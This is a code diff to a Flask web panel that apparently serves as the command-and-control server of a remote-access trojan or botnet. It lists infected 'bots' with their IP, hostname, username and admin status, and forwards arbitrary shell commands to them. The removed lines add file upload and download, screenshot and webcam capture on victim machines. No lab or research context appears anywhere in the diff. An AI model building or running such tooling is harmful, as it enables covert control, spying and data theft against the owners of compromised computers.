@@ -131,7 +131,11 @@ def get_targets():
             'ip': str(bot.ip),
             'alias': bot.alias,
             'connected_time': bot.connected_time.isoformat(),
-            'os_type': bot.os_type
+            'last_seen': bot.last_seen.isoformat(),
+            'os_type': bot.os_type,
+            'hostname': bot.hostname,
+            'username': bot.username,
+            'is_admin': bot.is_admin
         }
         targets.append(target_data)
     return jsonify(targets)
@@ -157,59 +161,37 @@ def upload_file():
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
     data = request.get_json()
-    session_id = int(data.get('session_id'))
+    session_id = data.get('session_id')
     command = data.get('command')
     
-    # Handle help command locally
-    if command == 'help':
-        return jsonify({'result': HELP_TEXT})
-    
     if session_id not in Bot.botList:
-        logging.warning(f"Invalid session ID attempted: {session_id}")
         return jsonify({'error': 'Invalid session ID'}), 400
         
     bot = Bot.botList[session_id]
-    logging.info(f"Command sent to Session {session_id} ({bot.ip}): {command}")
-    
-    if command == 'quit':
-        result = bot.kill()
-        logging.info(f"Session {session_id} ({bot.ip}) terminated")
-        return jsonify({'message': result})
-    
-    # Handle file upload commands
-    if command.startswith('upload '):
-        filename = command.split(' ')[1]
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename))
-        if not os.path.exists(filepath):
-            return jsonify({'error': f'File {filename} not found in uploads folder'}), 404
-        bot.reliable_send(command)
-        result = bot.upload_file(filepath)
-        return jsonify({'result': result})
-    
-    # Handle file download commands
-    if command.startswith('download '):
-        bot.reliable_send(command)
-        result = bot.download_file(command.split(' ')[1])
-        return jsonify({'result': result})
-    
-    # Handle screenshot command
-    if command == 'screenshot':
-        bot.reliable_send(command)
-        result = bot.screenshot()
-        return jsonify({'result': result})
-    
-    # Handle webcam command
-    if command == 'webcam':
-        bot.reliable_send(command)
-        result = bot.webcam()
-        return jsonify({'result': result})
-        
     try:
+        # Send command to agent
         bot.reliable_send(command)
-        result = bot.reliable_recv()
-        return jsonify({'result': result})
+        
+        # Get response from agent
+        response = bot.reliable_recv()
+        
+        # Update last seen time
+        bot.update_last_seen()
+        
+        # Log command execution
+        logging.info(f"Command sent to Session {session_id} ({bot.ip}): {command}")
+        
+        return jsonify({
+            'success': True,
+            'output': response,
+            'timestamp': datetime.now().isoformat()
+        })
+        
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        logging.error(f"Error executing command on Session {session_id}: {e}")
+        return jsonify({
+            'error': f'Command execution failed: {str(e)}'
+        }), 500
 
 @app.route('/api/set_alias', methods=['POST'])
 def set_alias():
